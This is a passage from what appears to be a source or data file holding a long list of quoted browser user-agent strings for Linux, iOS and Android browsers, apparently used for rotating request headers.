    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.3.894 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.43',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0 (Edition beta)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.15.2 Chrome/83.0.4103.122 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) splash Version/10.0 Safari/602.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Opera/9.80 (Android; Opera Mini/7.6.40234/191.278; U; ru) Presto/2.12.423 Version/12.16',
              'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (iPad; CPU OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/231.0.475926209 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.36 Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148  CSDNApp/5.11.1(iOS)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/236.0.484392333 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.92 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/93.0.4577.78 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/106.1  Mobile/15E148 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)  Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.42 Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/180.0.400278405 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [LinkedInApp]/9.25.434',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; A20S PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Safari/537.36 OPR/72.3.3767.68685',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE6j) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; YAL-L21; HMSCore 6.8.0.312; GMSCore 22.44.17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 2201117TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; BE2029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; BL8800Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; IN2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; moto g(9) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1971) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1992) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SHARK PRS-H0 Build/PROS2203060OS00MP5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/387.0.0.22.106;]',
    'Mozilla/5.0 (Linux; Android 11; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A207M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; TECNO BD2d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168',
    'Mozilla/5.0 (Linux; Android 12; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 22041211AC Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; A063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; DN2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; I2012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; KB2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LE2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LGE-AN00; HMSCore 6.8.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.4.302 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J20CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g(60)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; MT2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX3360) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A336E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
